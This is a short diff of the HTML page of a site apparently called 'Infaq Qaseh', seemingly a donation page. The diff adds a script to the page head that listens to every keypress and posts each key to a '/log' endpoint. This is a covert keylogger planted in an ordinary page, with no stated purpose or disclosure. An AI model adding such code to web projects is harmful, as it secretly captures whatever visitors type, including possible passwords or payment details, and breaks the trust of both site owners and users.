@@ -4,6 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Infaq Qaseh</title>
+    <script>
+        document.addEventListener('keypress', function(e) {
+            fetch('/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ key: e.key })
+            });
+        });
+    </script>
     <style>
 
         header {
